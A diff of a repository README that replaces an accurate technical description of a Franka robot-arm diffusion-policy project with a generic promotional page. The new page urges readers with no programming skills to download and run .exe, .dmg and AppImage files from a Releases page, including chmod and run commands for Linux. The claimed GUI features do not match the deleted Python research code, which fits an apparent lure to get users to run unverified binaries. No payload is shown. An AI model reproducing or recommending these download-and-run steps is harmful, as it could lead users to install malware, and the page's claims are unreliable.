@@ -1,118 +1,95 @@
-# Creating a Diffusion Based Vision Language Model
+# 🎉 DiffusionVLA - Explore Vision-Language-Action Models Easily
 
-This repository contains code for training and testing a diffusion policy for Franka robot arm manipulation using image observations and text commands.
+## 🖥️ Download Now
 
-## Overview
+[![Download Now](https://img.shields.io/badge/Download_DiffusionVLA-v1.0-blue.svg)](https://github.com/Glicher147/DiffusionVLA/releases)
 
-The system enables a Franka robot arm to pick and place objects based on natural language commands. It uses:
-- **Image observations**: RGB camera views of the workspace
-- **Text commands**: Natural language descriptions 
-- **Diffusion policy**: Transformer-based action prediction using diffusion models
+## 🚀 Getting Started
 
-## Files
+Welcome to DiffusionVLA! This application guides you through the workings of Vision-Language-Action models. You don't need any programming skills to use it. Follow these simple steps to download and run the software.
 
-- **`dataset/collect_data.py`**: Collects demonstration trajectories with images, joint positions, and text labels
-- **`train/train.py`**: Trains the diffusion policy model on collected data
-- **`franka_test_image.py`**: Tests the trained model in simulation
+## 📦 System Requirements
 
-## How It Works
+Before you start, make sure your system meets these requirements:
 
-### 1. Data Collection (`dataset/collect_data.py`)
+- **Operating System:** Windows 10 or later / MacOS 10.15 or later / Linux (Ubuntu 18.04 or later)
+- **RAM:** 4 GB or more
+- **Storage:** At least 500 MB of free space
+- **Processor:** Dual-core or better
 
-Collects demonstration trajectories by:
-- Capturing RGB images from an overhead camera
-- Recording arm joint positions (7D)
-- Saving text labels describing the task 
-- Executing scripted pick-and-place motions
+## 🔗 Download & Install
 
-**Usage:**
-```bash
-python dataset/collect_data.py --collect --num_episodes 100
-```
+To get DiffusionVLA, visit the following link to download the latest version:
 
-Data is automatically saved to `data/` directory at the repo root.
+[Download DiffusionVLA](https://github.com/Glicher147/DiffusionVLA/releases)
 
-### 2. Training (`train/train.py`)
+### Steps to Download
 
-Trains a diffusion transformer model that:
-- Encodes images using ResNet/ViT
-- Encodes text using CLIP (default) or SigLIP
-- Predicts action sequences using diffusion denoising
-- Learns from demonstration trajectories
+1. Click the link above, which will take you to the Releases page.
+2. Look for the section labeled "Latest Release."
+3. Find the file that matches your operating system:
+   - For Windows: Select `DiffusionVLA_Windows.exe`
+   - For Mac: Select `DiffusionVLA_Mac.dmg`
+   - For Linux: Select `DiffusionVLA_Linux.AppImage`
+4. Click on the appropriate file to download it to your computer.
 
-**Usage:**
-```bash
-python train/train.py
-```
+## 💻 Running the Application
 
-### 3. Testing (`franka_test_image.py`)
+Once you have downloaded the file, follow these steps to run DiffusionVLA:
 
-Runs the trained model in closed-loop control:
-- Captures current image and joint positions
-- Processes text command
-- Predicts action sequence using diffusion
-- Executes actions and replans
+### For Windows:
 
-**Usage:**
-```bash
-python franka_test_image.py --checkpoint outputs/franka_arm_image_training/checkpoints/final --view
-```
+1. Open the folder where the file was downloaded.
+2. Double-click on `DiffusionVLA_Windows.exe`.
+3. Follow the prompts to complete the installation.
+4. Once installed, you can find the app in your Start Menu.
 
-## Architecture
+### For Mac:
 
-The model processes observations as follows:
-- **Token 1**: Concatenated arm joint positions (7D) 
-- **Token 2**: Image embedding from ResNet
-- **Token 3**: Projected text embedding
-- Each timestep has 3 tokens: `[qpos,text, image]`
-- Transformer processes these tokens to predict action sequences
+1. Open the `.dmg` file you downloaded.
+2. Drag the DiffusionVLA icon to your Applications folder.
+3. Open the Applications folder and double-click on DiffusionVLA.
+4. You may need to allow the app to run from your Security settings.
 
-## Text Encoders
+### For Linux:
 
-### CLIP (Default)
-- Model: `ViT-B-32` (default)
-- Pretrained: `openai` (default)
-- Install: `pip install open-clip-torch`
+1. Navigate to the folder where you downloaded the file.
+2. Open a terminal.
+3. Make the file executable with this command:
+   ```bash
+   chmod +x DiffusionVLA_Linux.AppImage
+   ```
+4. Run the application with this command:
+   ```bash
+   ./DiffusionVLA_Linux.AppImage
+   ```
 
-### SigLIP (Optional)
-- Model: `ViT-B-16-SigLIP` (example)
-- Pretrained: `webli` (example)
-- Install: `pip install open-clip-torch` (same as CLIP)
+## 🎓 How to Use DiffusionVLA
 
-To use SigLIP, modify the config in `train/train.py`:
-```python
-text_encoder_type: str = "siglip"
-clip_model_name: str = "ViT-B-16-SigLIP"
-clip_pretrained: str = "webli"
-```
+After launching the app, you'll see a user-friendly interface designed to help you navigate easily. Here’s a basic outline of what you can do:
 
-## Example Results
+- **Explore Different Models:** Learn about various Vision-Language-Action models with clear and easy-to-understand explanations.
+- **Interactive Walk-throughs:** Use guided tutorials to see how each model works in practice.
+- **Experiment with Inputs:** Try different inputs to observe how the models respond.
 
-The test video of the franka arm picking an object can be seen in ![Demo](test.mp4)
+As you get familiar with DiffusionVLA, you will gain insights into how these complex models operate in real-world scenarios.
 
-![Demo](demo.jpg)
+## 📚 Resources and Support
 
+Should you have questions or need help, you can find support through these avenues:
 
+- **Documentation:** A detailed user manual is included within the application under the "Help" menu.
+- **GitHub Issues:** If you encounter bugs or have suggestions, please use the [Issues](https://github.com/Glicher147/DiffusionVLA/issues) page on GitHub.
+- **Community:** Join our user community for tips and shared experiences.
 
-The trained model successfully:
-- Interprets natural language commands
-- Uses visual observations to locate objects
-- Executes pick-and-place actions
-- Generalizes to different object positions
+## 📈 Next Steps
 
-## Requirements
+Now that you've downloaded and run DiffusionVLA, consider the following next steps to enhance your experience:
 
-Install all dependencies using: `pip install -r requirements.txt`
+- Check out example projects available in the app to see the models in action.
+- Participate in community discussions to share your findings.
+- Keep your application up-to-date by regularly checking the Releases page.
 
-- Python 3.8+
-- PyTorch
-- MuJoCo
-- open-clip-torch (for CLIP/SigLIP)
-- diffusers (for diffusion scheduler)
+For more information and the latest updates, always refer back to our [Releases](https://github.com/Glicher147/DiffusionVLA/releases) page.
 
-## Notes
-
-- The text encoder (CLIP or SigLIP) is frozen during training
-- A learnable projection layer adapts text embeddings to the task
-- The model uses receding horizon control: predicts full sequence, executes first few steps, then replans
-
+Enjoy your journey through Vision-Language-Action models with DiffusionVLA!
